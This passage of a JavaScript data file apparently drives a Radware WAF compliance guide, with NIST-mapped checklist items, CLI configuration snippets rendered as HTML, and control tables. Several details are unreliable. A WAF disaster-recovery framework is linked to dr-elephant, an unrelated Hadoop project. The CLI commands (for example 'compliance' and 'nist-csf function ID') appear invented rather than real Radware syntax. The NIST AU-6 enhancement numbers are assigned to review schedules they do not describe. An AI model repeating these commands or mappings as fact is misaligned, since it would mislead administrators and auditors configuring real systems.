            description: 'Tool for managing and automating AppWall configuration backups.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Backup Tools'
        },
        {
            title: 'DR Testing Framework for AppWall',
            icon: 'fa-clipboard-check',
            description: 'Framework for conducting and documenting DR tests for Radware WAF.',
            link: 'https://github.com/linkedin/dr-elephant',
            linkText: 'DR Framework'
        },
        {
            title: 'APSolute Vision',
            icon: 'fa-eye',
            description: 'Radware\'s centralized management tool for monitoring WAF clusters.',
            link: 'https://www.radware.com/products/apsolute-vision/',
            linkText: 'APSolute Vision'
        },
        {
            title: 'Radware ERT Active Attackers Feed',
            icon: 'fa-shield-alt',
            description: 'Real-time threat intelligence for maintaining WAF security during failover.',
            link: 'https://www.radware.com/products/threat-intelligence/',
            linkText: 'ERT Feed'
        },
        {
            title: 'Radware DefensePro Sync Tool',
            icon: 'fa-sync-alt',
            description: 'Tool for synchronizing DefensePro configurations across HA clusters.',
            link: 'https://www.radware.com/products/defensepro/',
            linkText: 'DefensePro Tools'
        },
        {
            title: 'Radware Cloud WAF Portal',
            icon: 'fa-cloud',
            description: 'Management interface for configuring hybrid on-premises and cloud WAF DR.',
            link: 'https://www.radware.com/products/cloud-waf-service/',
            linkText: 'Cloud WAF Portal'
        }
    ]
},
       {
    id: 'compliance',
    title: '12. Compliance & Governance',
    subtitle: 'NIST framework alignment and security policy management for Radware WAF',
    icon: 'fa-balance-scale',
    priority: 'high',
    progress: 25,
    checklist: [
        {
            title: '12.1 NIST Framework Compliance',
            icon: 'fa-shield-alt',
            items: [
                { id: '12.1.1', text: 'Configure NIST CSF Identify (ID) function controls', priority: 'high' },
                { id: '12.1.2', text: 'Implement NIST CSF Protect (PR) function requirements', priority: 'critical' },
                { id: '12.1.3', text: 'Set up NIST CSF Detect (DE) function mechanisms', priority: 'high' },
                { id: '12.1.4', text: 'Configure NIST CSF Respond (RS) function capabilities', priority: 'high' },
                { id: '12.1.5', text: 'Implement NIST CSF Recover (RC) function controls', priority: 'medium' },
                { id: '12.1.6', text: 'Set up NIST 800-53 control mapping and verification', priority: 'high' },
                { id: '12.1.7', text: 'Configure NIST 800-41 firewall policy requirements', priority: 'high' },
                { id: '12.1.8', text: 'Implement NIST 800-95 web service protection controls', priority: 'high' }
            ]
        },
        {
            title: '12.2 Additional Regulatory Compliance',
            icon: 'fa-clipboard-check',
            items: [
                { id: '12.2.1', text: 'Configure PCI DSS compliance settings', priority: 'high' },
                { id: '12.2.2', text: 'Set up GDPR compliance controls', priority: 'high' },
                { id: '12.2.3', text: 'Implement HIPAA security requirements', priority: 'high' },
                { id: '12.2.4', text: 'Configure OWASP Top 10 protections', priority: 'critical' },
                { id: '12.2.5', text: 'Set up FedRAMP compliance controls', priority: 'high' },
                { id: '12.2.6', text: 'Implement FISMA security requirements', priority: 'high' },
                { id: '12.2.7', text: 'Configure SOC2 compliance controls', priority: 'medium' },
                { id: '12.2.8', text: 'Set up ISO 27001 compliance mapping', priority: 'medium' }
            ]
        },
        {
            title: '12.3 NIST-Aligned Audit & Documentation',
            icon: 'fa-file-alt',
            items: [
                { id: '12.3.1', text: 'Configure NIST 800-53 AU-compliant audit logging', priority: 'critical' },
                { id: '12.3.2', text: 'Set up NIST-compliant configuration change tracking', priority: 'high' },
                { id: '12.3.3', text: 'Implement NIST 800-53 CM controls for WAF', priority: 'high' },
                { id: '12.3.4', text: 'Document security policy justifications per NIST standards', priority: 'medium' },
                { id: '12.3.5', text: 'Create NIST-aligned WAF configuration documentation', priority: 'medium' },
                { id: '12.3.6', text: 'Set up NIST 800-53 CA control implementation', priority: 'high' },
                { id: '12.3.7', text: 'Configure NIST-compliant security assessment mechanisms', priority: 'high' },
                { id: '12.3.8', text: 'Implement NIST 800-53 RA control documentation', priority: 'medium' }
            ]
        },
        {
            title: '12.4 Policy Management',
            icon: 'fa-tasks',
            items: [
                { id: '12.4.1', text: 'Configure policy inheritance and hierarchy aligned with NIST', priority: 'medium' },
                { id: '12.4.2', text: 'Set up environment-specific policies per NIST 800-53 CM-2', priority: 'high' },
                { id: '12.4.3', text: 'Implement NIST-compliant policy approval workflows', priority: 'medium' },
                { id: '12.4.4', text: 'Configure policy templates based on NIST baselines', priority: 'high' },
                { id: '12.4.5', text: 'Set up regular policy effectiveness reviews per NIST CA-2', priority: 'high' },
                { id: '12.4.6', text: 'Document policy exceptions with NIST-aligned justifications', priority: 'medium' },
                { id: '12.4.7', text: 'Implement NIST 800-53 CM-3 change control processes', priority: 'high' },
                { id: '12.4.8', text: 'Configure NIST-aligned security baseline templates', priority: 'medium' }
            ]
        },
        {
            title: '12.5 Access Control & Authorization',
            icon: 'fa-user-lock',
            items: [
                { id: '12.5.1', text: 'Configure NIST 800-53 AC controls for WAF administration', priority: 'critical' },
                { id: '12.5.2', text: 'Implement role-based access control per NIST 800-53 AC-2', priority: 'high' },
                { id: '12.5.3', text: 'Set up privileged account management per NIST 800-53 AC-6', priority: 'critical' },
                { id: '12.5.4', text: 'Configure access review processes aligned with NIST 800-53 AC-2(3)', priority: 'high' },
                { id: '12.5.5', text: 'Implement separation of duties per NIST 800-53 AC-5', priority: 'high' },
                { id: '12.5.6', text: 'Set up least privilege enforcement per NIST 800-53 AC-6', priority: 'critical' },
                { id: '12.5.7', text: 'Configure session timeout controls per NIST 800-53 AC-11', priority: 'medium' },
                { id: '12.5.8', text: 'Implement remote access protections per NIST 800-53 AC-17', priority: 'high' }
            ]
        },
        {
            title: '12.6 System Integrity & Security Assessment',
            icon: 'fa-check-double',
            items: [
                { id: '12.6.1', text: 'Configure NIST 800-53 SI controls for WAF integrity', priority: 'high' },
                { id: '12.6.2', text: 'Implement flaw remediation processes per NIST 800-53 SI-2', priority: 'high' },
                { id: '12.6.3', text: 'Set up malicious code protection per NIST 800-53 SI-3', priority: 'high' },
                { id: '12.6.4', text: 'Configure security function verification per NIST 800-53 SI-6', priority: 'medium' },
                { id: '12.6.5', text: 'Implement software and information integrity monitoring per NIST 800-53 SI-7', priority: 'high' },
                { id: '12.6.6', text: 'Set up security assessment processes per NIST 800-53 CA-2', priority: 'high' },
                { id: '12.6.7', text: 'Configure continuous monitoring per NIST 800-53 CA-7', priority: 'high' },
                { id: '12.6.8', text: 'Implement penetration testing for WAF per NIST 800-53 CA-8', priority: 'medium' }
            ]
        },
        {
            title: '12.7 Risk Assessment & Management',
            icon: 'fa-chart-line',
            items: [
                { id: '12.7.1', text: 'Configure NIST risk assessment methodology for WAF', priority: 'high' },
                { id: '12.7.2', text: 'Implement vulnerability scanning per NIST 800-53 RA-5', priority: 'high' },
                { id: '12.7.3', text: 'Set up risk assessment processes per NIST 800-53 RA-3', priority: 'high' },
                { id: '12.7.4', text: 'Configure vulnerability management workflows per NIST guidelines', priority: 'high' },
                { id: '12.7.5', text: 'Implement threat intelligence integration per NIST CSF ID.RA-2', priority: 'medium' },
                { id: '12.7.6', text: 'Set up risk response strategies aligned with NIST 800-39', priority: 'medium' },
                { id: '12.7.7', text: 'Configure supply chain risk management per NIST 800-53 SR family', priority: 'medium' },
                { id: '12.7.8', text: 'Implement technical surveillance countermeasures per NIST 800-53 RA-6', priority: 'low' }
            ]
        }
    ],
    techniques: [
        {
            title: 'NIST Cybersecurity Framework Implementation',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF protections to align with the NIST Cybersecurity Framework's five core functions.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure NIST CSF alignment for Radware WAF</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">compliance</span></div>
                    <div><span class="code-command">nist-csf</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">framework-version</span> <span class="code-value">1.1</span></div>
                    <div class="code-comment"># IDENTIFY function configuration</div>
                    <div><span class="code-command">function</span> <span class="code-value">ID</span></div>
                    <div><span class="code-param">asset-management</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">risk-assessment</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># PROTECT function configuration</div>
                    <div><span class="code-command">function</span> <span class="code-value">PR</span></div>
                    <div><span class="code-param">access-control</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">data-security</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">information-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">protective-technology</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># DETECT function configuration</div>
                    <div><span class="code-command">function</span> <span class="code-value">DE</span></div>
                    <div><span class="code-param">anomalies-events</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">continuous-monitoring</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">detection-processes</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># RESPOND function configuration</div>
                    <div><span class="code-command">function</span> <span class="code-value">RS</span></div>
                    <div><span class="code-param">response-planning</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">analysis</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">mitigation</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># RECOVER function configuration</div>
                    <div><span class="code-command">function</span> <span class="code-value">RC</span></div>
                    <div><span class="code-param">recovery-planning</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">improvements</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">NIST CSF Core Functions in Radware WAF Implementation</h5>
                <p class="mb-4 text-gray-700">Key NIST Cybersecurity Framework functions and their mapping to Radware WAF capabilities:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Function</th>
                            <th class="p-3 border bg-gray-100">Category</th>
                            <th class="p-3 border bg-gray-100">Radware WAF Implementation</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border" rowspan="3">IDENTIFY (ID)</td>
                            <td class="p-3 border">Asset Management (ID.AM)</td>
                            <td class="p-3 border">Web application asset inventory, API discovery and classification</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Risk Assessment (ID.RA)</td>
                            <td class="p-3 border">Vulnerability scanning, threat modeling, exposure assessment</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Supply Chain Risk Management (ID.SC)</td>
                            <td class="p-3 border">Third-party component monitoring, software composition analysis</td>
                        </tr>
                        <tr>
                            <td class="p-3 border" rowspan="4">PROTECT (PR)</td>
                            <td class="p-3 border">Identity Management & Access Control (PR.AC)</td>
                            <td class="p-3 border">Authentication enforcement, session management, access control</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Data Security (PR.DS)</td>
                            <td class="p-3 border">Data leakage prevention, encryption enforcement, sensitive data masking</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Information Protection Processes (PR.IP)</td>
                            <td class="p-3 border">Baseline configuration, secure SDLC integration, policy management</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Protective Technology (PR.PT)</td>
                            <td class="p-3 border">Attack signature detection, protocol validation, bot protection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border" rowspan="3">DETECT (DE)</td>
                            <td class="p-3 border">Anomalies and Events (DE.AE)</td>
                            <td class="p-3 border">Behavioral analysis, anomaly detection, correlation of events</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Security Continuous Monitoring (DE.CM)</td>
                            <td class="p-3 border">Real-time traffic analysis, security scanning, vulnerability monitoring</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Detection Processes (DE.DP)</td>
                            <td class="p-3 border">Threat intelligence integration, event correlation, detection testing</td>
                        </tr>
                        <tr>
                            <td class="p-3 border" rowspan="3">RESPOND (RS)</td>
                            <td class="p-3 border">Response Planning (RS.RP)</td>
                            <td class="p-3 border">Incident response plan execution, mitigation activation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Analysis (RS.AN)</td>
                            <td class="p-3 border">Forensic data collection, attack pattern analysis, impact assessment</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Mitigation (RS.MI)</td>
                            <td class="p-3 border">Virtual patching, attack containment, automated defense activation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border" rowspan="2">RECOVER (RC)</td>
                            <td class="p-3 border">Recovery Planning (RC.RP)</td>
                            <td class="p-3 border">Configuration backup, restoration procedures, service continuity</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Improvements (RC.IM)</td>
                            <td class="p-3 border">Lessons learned analysis, control updates, prevention enhancement</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">NIST CSF Implementation Levels for Radware WAF</h5>
                <p class="mb-4 text-gray-700">Framework implementation tiers for progressive maturity:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Tier 1 (Partial):</strong> Basic WAF configuration with standard rulesets, minimal customization, and reactive security management</li>
                    <li class="mb-2"><strong>Tier 2 (Risk Informed):</strong> Tailored WAF policies, formal approval processes, risk-based configuration with regular reviews</li>
                    <li class="mb-2"><strong>Tier 3 (Repeatable):</strong> Standardized WAF deployment with automated policy management, continuous monitoring, and integration with other security controls</li>
                    <li class="mb-2"><strong>Tier 4 (Adaptive):</strong> Advanced WAF implementation with machine learning, automated adaptation to threats, comprehensive metrics, and full integration into security ecosystem</li>
                </ul>
            `
        },
        {
            title: 'NIST SP 800-53 Controls for Radware WAF',
            content: `
                <p class="mb-4 text-gray-700">Implement NIST Special Publication 800-53 security controls for Radware WAF to ensure comprehensive compliance with federal standards.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure NIST SP 800-53 controls</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">compliance</span></div>
                    <div><span class="code-command">nist-800-53</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">revision</span> <span class="code-value">5</span></div>
                    <div class="code-comment"># Access Control family</div>
                    <div><span class="code-command">family</span> <span class="code-value">AC</span></div>
                    <div><span class="code-param">AC-3-enforced-access-control</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">AC-4-information-flow-control</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">AC-6-least-privilege</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">AC-17-remote-access</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Audit and Accountability family</div>
                    <div><span class="code-command">family</span> <span class="code-value">AU</span></div>
                    <div><span class="code-param">AU-2-event-logging</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">AU-3-content-of-records</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">AU-6-audit-review</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">AU-9-protection-of-audit-info</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">AU-12-audit-generation</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># System and Information Integrity family</div>
                    <div><span class="code-command">family</span> <span class="code-value">SI</span></div>
                    <div><span class="code-param">SI-3-malicious-code-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">SI-4-system-monitoring</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">SI-7-software-integrity</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">SI-10-information-input-validation</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Security Assessment and Authorization family</div>
                    <div><span class="code-command">family</span> <span class="code-value">CA</span></div>
                    <div><span class="code-param">CA-2-assessments</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">CA-7-continuous-monitoring</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Key NIST 800-53 Controls for Radware WAF</h5>
                <p class="mb-4 text-gray-700">Critical controls from NIST SP 800-53 and their implementation in Radware WAF:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Control Family</th>
                            <th class="p-3 border bg-gray-100">Control ID</th>
                            <th class="p-3 border bg-gray-100">Control Name</th>
                            <th class="p-3 border bg-gray-100">Radware WAF Implementation</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border" rowspan="4">Access Control (AC)</td>
                            <td class="p-3 border">AC-3</td>
                            <td class="p-3 border">Access Enforcement</td>
                            <td class="p-3 border">URL access restrictions, authentication enforcement, IP-based access controls</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">AC-4</td>
                            <td class="p-3 border">Information Flow Enforcement</td>
                            <td class="p-3 border">Traffic filtering, data leakage prevention, protocol enforcement</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">AC-6</td>
                            <td class="p-3 border">Least Privilege</td>
                            <td class="p-3 border">Administrative access controls, role-based management</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">AC-17</td>
                            <td class="p-3 border">Remote Access</td>
                            <td class="p-3 border">Secure administrative interfaces, encrypted communication channels</td>
                        </tr>
                        <tr>
                            <td class="p-3 border" rowspan="5">Audit and Accountability (AU)</td>
                            <td class="p-3 border">AU-2</td>
                            <td class="p-3 border">Event Logging</td>
                            <td class="p-3 border">Comprehensive security event logging, attack detection recording</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">AU-3</td>
                            <td class="p-3 border">Content of Audit Records</td>
                            <td class="p-3 border">Detailed event information, contextual data capture</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">AU-6</td>
                            <td class="p-3 border">Audit Review, Analysis, and Reporting</td>
                            <td class="p-3 border">Security dashboard, event correlation, automated reporting</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">AU-9</td>
                            <td class="p-3 border">Protection of Audit Information</td>
                            <td class="p-3 border">Log integrity verification, secure log transmission</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">AU-12</td>
                            <td class="p-3 border">Audit Generation</td>
                            <td class="p-3 border">Configurable logging policies, selective event recording</td>
                        </tr>
                        <tr>
                            <td class="p-3 border" rowspan="4">System and Information Integrity (SI)</td>
                            <td class="p-3 border">SI-3</td>
                            <td class="p-3 border">Malicious Code Protection</td>
                            <td class="p-3 border">Attack signature detection, malware blocking, zero-day protection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">SI-4</td>
                            <td class="p-3 border">System Monitoring</td>
                            <td class="p-3 border">Real-time traffic analysis, behavior monitoring, threat detection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">SI-7</td>
                            <td class="p-3 border">Software, Firmware, and Information Integrity</td>
                            <td class="p-3 border">Policy integrity verification, signature validation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">SI-10</td>
                            <td class="p-3 border">Information Input Validation</td>
                            <td class="p-3 border">Input parameter validation, content sanitization, format verification</td>
                        </tr>
                        <tr>
                            <td class="p-3 border" rowspan="3">Security Assessment and Authorization (CA)</td>
                            <td class="p-3 border">CA-2</td>
                            <td class="p-3 border">Security Assessments</td>
                            <td class="p-3 border">Security assessment tools, vulnerability scanning integration</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">CA-7</td>
                            <td class="p-3 border">Continuous Monitoring</td>
                            <td class="p-3 border">Ongoing security status monitoring, metrics collection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">CA-8</td>
                            <td class="p-3 border">Penetration Testing</td>
                            <td class="p-3 border">Testing mode functionality, security control validation</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">NIST 800-53 Control Baselines</h5>
                <p class="mb-4 text-gray-700">Implementing appropriate control baselines based on system categorization:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Low Impact:</strong> Basic WAF controls with standard signature detection and logging</li>
                    <li class="mb-2"><strong>Moderate Impact:</strong> Enhanced WAF configuration with advanced detection, robust logging, and regular assessments</li>
                    <li class="mb-2"><strong>High Impact:</strong> Comprehensive WAF implementation with full feature set, continuous monitoring, and rigorous security controls</li>
                </ul>
            `
        },
        {
            title: 'NIST-Compliant Security Audit Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure comprehensive audit logging in Radware WAF to meet NIST 800-53 Audit and Accountability (AU) requirements.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure NIST-compliant security auditing</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">auditing</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># NIST 800-53 AU-2: Audit Events</div>
                    <div><span class="code-command">audit-events</span></div>
                    <div><span class="code-param">security-events</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">admin-actions</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">policy-changes</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">system-events</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">access-attempts</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># NIST 800-53 AU-3: Content of Audit Records</div>
                    <div><span class="code-command">audit-content</span></div>
                    <div><span class="code-param">timestamp</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">source-address</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">user-identity</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">event-type</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">success-failure</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">object-identifier</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># NIST 800-53 AU-4: Audit Storage Capacity</div>
                    <div><span class="code-param">storage-capacity</span> <span class="code-value">10GB</span></div>
                    <div><span class="code-param">storage-warning-threshold</span> <span class="code-value">80</span></div>
                    <div class="code-comment"># NIST 800-53 AU-5: Response to Audit Processing Failures</div>
                    <div><span class="code-command">audit-failure-response</span></div>
                    <div><span class="code-param">alert-admins</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">overwrite-oldest</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">backup-destination</span> <span class="code-value">syslog-servers</span></div>
                    <div class="code-comment"># NIST 800-53 AU-6: Audit Review, Analysis, and Reporting</div>
                    <div><span class="code-command">audit-review</span></div>
                    <div><span class="code-param">automated-review</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">correlation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">report-generation</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># NIST 800-53 AU-9: Protection of Audit Information</div>
                    <div><span class="code-command">audit-protection</span></div>
                    <div><span class="code-param">integrity-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">access-control</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">encryption</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># NIST 800-53 AU-12: Audit Generation</div>
                    <div><span class="code-command">audit-generation</span></div>
                    <div><span class="code-param">system-wide</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">selectable-events</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">NIST-Compliant Audit Log Review Process</h5>
                <p class="mb-4 text-gray-700">Structured approach for reviewing security audit logs per NIST guidelines:</p>
                <ol class="list-decimal pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Continuous Monitoring (AU-6):</strong> Automated review of critical security events with real-time alerting</li>
                    <li class="mb-2"><strong>Daily Review (AU-6(1)):</strong> Security team examination of significant events, administrative actions, and anomalies</li>
                    <li class="mb-2"><strong>Weekly Analysis (AU-6(3)):</strong> Correlation of events across systems, pattern identification, trend analysis</li>
                    <li class="mb-2"><strong>Monthly Comprehensive Review (AU-6(4)):</strong> In-depth analysis of all security-relevant activities, configuration changes</li>
                    <li class="mb-2"><strong>Quarterly Compliance Assessment (AU-6(5)):</strong> Validation of audit records against compliance requirements, gap analysis</li>
                    <li class="mb-2"><strong>Integrated Analysis (AU-6(6)):</strong> Correlation with vulnerability assessment data, threat intelligence</li>
                </ol>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Audit Record Requirements per NIST</h5>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Audit Record Type</th>
                            <th class="p-3 border bg-gray-100">Required Content</th>
                            <th class="p-3 border bg-gray-100">Retention Period</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Security Events</td>
                            <td class="p-3 border">Timestamp, event type, source, outcome, severity, affected resource</td>
                            <td class="p-3 border">12 months</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Administrative Actions</td>
                            <td class="p-3 border">Timestamp, user identity, action performed, affected component, result</td>
                            <td class="p-3 border">18 months</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Policy Changes</td>
                            <td class="p-3 border">Timestamp, user identity, change details, previous and new values</td>
                            <td class="p-3 border">24 months</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Access Attempts</td>
                            <td class="p-3 border">Timestamp, source address, user identity, resource, outcome</td>
                            <td class="p-3 border">12 months</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">System Events</td>
                            <td class="p-3 border">Timestamp, event type, affected component, severity, outcome</td>
                            <td class="p-3 border">6 months</td>
                        </tr>
                    </tbody>
                </table>
            `
        },
        {
            title: 'NIST-Aligned Policy Lifecycle Management',
            content: `
                <p class="mb-4 text-gray-700">Implement structured processes for managing Radware WAF security policies according to NIST guidelines.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure NIST-aligned policy management</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">policy-management</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># NIST 800-53 CM-2: Baseline Configuration</div>
                    <div><span class="code-command">baseline-templates</span></div>
                    <div><span class="code-command">template</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"nist-low"</span></div>
                    <div><span class="code-command">template</span> <span class="code-value">"nist-low"</span></div>
                    <div><span class="code-param">description</span> <span class="code-value">"NIST Low baseline protection for web applications"</span></div>
                    <div><span class="code-param">sensitivity</span> <span class="code-value">low</span></div>
                    <div><span class="code-param">base-policy</span> <span class="code-value">"NIST-Low-Baseline"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">template</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"nist-moderate"</span></div>
                    <div><span class="code-command">template</span> <span class="code-value">"nist-moderate"</span></div>
                    <div><span class="code-param">description</span> <span class="code-value">"NIST Moderate baseline protection for web applications"</span></div>
                    <div><span class="code-param">sensitivity</span> <span class="code-value">medium</span></div>
                    <div><span class="code-param">base-policy</span> <span class="code-value">"NIST-Moderate-Baseline"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">template</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"nist-high"</span></div>
                    <div><span class="code-command">template</span> <span class="code-value">"nist-high"</span></div>
                    <div><span class="code-param">description</span> <span class="code-value">"NIST High baseline protection for web applications"</span></div>
                    <div><span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">base-policy</span> <span class="code-value">"NIST-High-Baseline"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># NIST 800-53 CM-3: Configuration Change Control</div>
                    <div><span class="code-command">change-control</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">documentation-required</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">security-impact-assessment</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">approval-workflow</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># NIST 800-53 CM-4: Security Impact Analysis</div>
                    <div><span class="code-command">impact-analysis</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">testing-required</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">documentation-required</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># NIST 800-53 CA-7: Continuous Monitoring</div>
                    <div><span class="code-command">policy-monitoring</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">effectiveness-metrics</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">review-schedule</span> <span class="code-value">quarterly</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">NIST-Aligned Policy Lifecycle Stages</h5>
                <p class="mb-4 text-gray-700">The complete lifecycle of WAF security policies according to NIST guidelines:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Stage</th>
                            <th class="p-3 border bg-gray-100">NIST Controls</th>
                            <th class="p-3 border bg-gray-100">Activities</th>
                            <th class="p-3 border bg-gray-100">Documentation Requirements</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Policy Planning</td>
                            <td class="p-3 border">PL-2, RA-3</td>
                            <td class="p-3 border">Security requirements analysis, risk assessment, baseline selection</td>
                            <td class="p-3 border">Security requirements document, risk assessment report</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Policy Creation</td>
                            <td class="p-3 border">CM-2, CM-6</td>
                            <td class="p-3 border">Baseline template selection, customization, rule development</td>
                            <td class="p-3 border">Policy specification, configuration details</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Policy Review</td>
                            <td class="p-3 border">CM-4, CA-2</td>
                            <td class="p-3 border">Security impact analysis, compliance verification</td>
